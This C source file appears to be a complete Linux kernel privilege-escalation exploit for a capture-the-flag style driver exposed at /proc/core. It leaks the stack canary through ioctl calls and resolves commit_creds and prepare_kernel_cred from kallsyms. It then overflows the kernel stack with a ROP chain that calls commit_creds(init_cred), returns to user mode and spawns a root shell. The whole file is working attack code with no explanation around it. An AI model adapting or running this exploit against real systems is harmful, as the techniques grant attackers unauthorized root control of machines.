#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <sys/types.h>

static size_t pop_rdi = 0xffffffff81000b2f; // pop rdi ; ret
static size_t swapgs = 0xffffffff81a012da; // swapgs ; popfq ; ret
static size_t iretq = 0xffffffff81050ac2; 
static size_t mov_cr4_rdi = 0xffffffff81075014; // mov cr4, rdi ; push rdx ; popfq ; ret
static size_t commit_creds = 0, prepare_kernel_cred = 0;
static size_t init_cred = 0xffffffff8223d1a0;
static size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81a008da;
int fd;

size_t user_cs, user_ss, user_rsp, user_rflags;
void save_status()
{
	__asm__("mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_rsp, rsp;"
		"pushf;"
		"pop user_rflags;");
	puts("\033[32m[+]save status successfully\033[0m");
}


void core_read(char* buf)
{
	ioctl(fd, 0x6677889B, buf);
}

void set_off(size_t off)
{
	ioctl(fd, 0x6677889C, off);
}

void core_copy(long long len)
{
	ioctl(fd, 0x6677889A, len);
}


int find_syms()
{
	FILE* fp = fopen("/tmp/kallsyms", "r");
	size_t addr;
	char type[5], name[0x50];
	
	while (fscanf(fp, "%lx%s%s", &addr, type, name))
	{
		if (commit_creds && prepare_kernel_cred) return 1;
		else if (!commit_creds && !strcmp(name, "commit_creds")) commit_creds = addr;
		else if (!prepare_kernel_cred && !strcmp(name, "prepare_kernel_cred")) prepare_kernel_cred = addr;
	}
	return 0;
}

void get_root_shell()
{
	if (!getuid())
	{
		puts("\033[32m[+]Root privilege");
		system("/bin/sh");
	} else {
		puts("\033[31m[X]Failed to get root privilege");
		exit(-1);
	}
	
}

void get_root_privilege()
{
	void* (*pkc)(void *) = prepare_kernel_cred;
	int (*cr)(void *) = commit_creds;
	cr(pkc(NULL));
}

int main(int argc, char** argv, char** env)
{
	save_status();
	fd = open("/proc/core", O_RDWR);
	size_t offset, rop[0x100], buf[0x30], canary;
	int res = find_syms();
	if (res) offset = commit_creds - 0xffffffff8109c8e0;
	else puts("\033[31m[X]Failed to find syms\033[0m"), exit(-1);
	printf("\033[32m[+]commit_creds: %#lx\n\033[0m", commit_creds);
	printf("\033[32m[+]prepare_kernel_cred: %#lx\n\033[0m", prepare_kernel_cred);
	printf("\033[32m[+]offset: %#lx\n\033[0m", offset);
	
	set_off(0x40);
	core_read((char*)buf);
	canary = buf[0];
	printf("\033[32m[+]canary: %#lx\n\033[0m", canary);
	
	int i = 0;
	for (i = 0; i < 10; i++) rop[i] = canary;
	rop[i++] = pop_rdi+offset;
	rop[i++] = init_cred+offset;
	rop[i++] = commit_creds;
	//rop[i++] = pop_rdi+offset;
	//rop[i++] = 0x6f0;
	//rop[i++] = mov_cr4_rdi+offset;
	//rop[i++] = get_root_privilege;
	//rop[i++] = swapgs+offset;
	rop[i++] = swapgs_restore_regs_and_return_to_usermode+offset+22;
	rop[i++] = 0;
	rop[i++] = 0;
	//rop[i++] = iretq+offset;
	rop[i++] = get_root_shell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_rsp;
	rop[i++] = user_ss;
	write(fd, rop, 0x200);
	core_copy(0xffffffffffff0000 | (0xA8));
	//core_copy(-1);
	return 0;
}
